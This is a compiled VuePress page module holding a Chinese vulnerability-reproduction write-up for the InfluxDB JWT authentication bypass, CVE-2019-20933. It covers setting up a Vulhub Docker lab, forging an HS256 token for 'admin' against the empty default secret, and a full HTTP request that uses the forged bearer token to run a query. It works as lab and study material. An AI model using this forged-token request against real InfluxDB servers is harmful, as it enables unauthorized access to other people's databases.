import{_ as o}from"./plugin-vue_export-helper-c27b6911.js";import{r as l,o as s,c as d,a as e,b as n,d as t,e as a}from"./app-58e4a7d6.js";const r={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),u=e("p",null,"InfluxDB是一款著名的时序数据库，其使用jwt作为鉴权方式。",-1),p=e("p",null,[n("在其1.7.6版本以前，默认设置jwt的认证密钥"),e("code",null,"shared-secret"),n("为空字符串，导致攻击者可以伪造任意用户身份在InfluxDB中执行SQL语句。")],-1),h=e("p",null,"参考链接：",-1),m={href:"https://www.komodosec.com/post/when-all-else-fails-find-a-0-day",target:"_blank",rel:"noopener noreferrer"},b={href:"https://github.com/influxdata/influxdb/issues/12927",target:"_blank",rel:"noopener noreferrer"},v={href:"https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933",target:"_blank",rel:"noopener noreferrer"},g={href:"https://docs.influxdata.com/influxdb/v1.7/administration/config/#http-endpoints-settings",target:"_blank",rel:"noopener noreferrer"},f=a(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动InfluxDB 1.6.6：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:8086/debug/vars</code>即可查看一些服务信息，但此时执行SQL语句则会出现401错误：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230504104909482.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,6),_={href:"https://jwt.io/",target:"_blank",rel:"noopener noreferrer"},x=a(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>{
  &quot;alg&quot;: &quot;HS256&quot;,
  &quot;typ&quot;: &quot;JWT&quot;
}
{
  &quot;username&quot;: &quot;admin&quot;,
  &quot;exp&quot;: 1998787794
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1),k=e("code",null,"admin",-1),w=e("code",null,"exp",-1),I={href:"https://tool.lu/timestamp/",target:"_blank",rel:"noopener noreferrer"},q=a(`<p>最终生成的token：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230504105424366.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>发送带有这个jwt token的数据包，可见SQL语句执行成功：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /query HTTP/1.1
Host: your-ip:8086
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxOTk4Nzg3Nzk0fQ.i69iSGK3q5OCEX0aExMKHciDG7nivuz4xHTgyj4-CPY
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

db=sample&amp;q=show+users
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230504105755072.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,5);function y(T,E){const i=l("ExternalLinkIcon");return s(),d("div",null,[c,u,p,h,e("ul",null,[e("li",null,[e("a",m,[n("https://www.komodosec.com/post/when-all-else-fails-find-a-0-day"),t(i)])]),e("li",null,[e("a",b,[n("https://github.com/influxdata/influxdb/issues/12927"),t(i)])]),e("li",null,[e("a",v,[n("https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933"),t(i)])]),e("li",null,[e("a",g,[n("https://docs.influxdata.com/influxdb/v1.7/administration/config/#http-endpoints-settings"),t(i)])])]),f,e("p",null,[n("借助"),e("a",_,[n("https://jwt.io/"),t(i)]),n("来生成jwt token：")]),x,e("p",null,[n("其中，"),k,n("是一个已经存在的用户，"),w,n("是一个时间戳，代表着这个token的过期时间，你需要设置为一个未来的时间戳。借助"),e("a",I,[n("https://tool.lu/timestamp/"),t(i)]),n("来生成时间戳。")]),q])}const B=o(r,[["render",y],["__file","InfluxDB JWT 认证绕过漏洞 CVE-2019-20933.html.vue"]]);export{B as default};
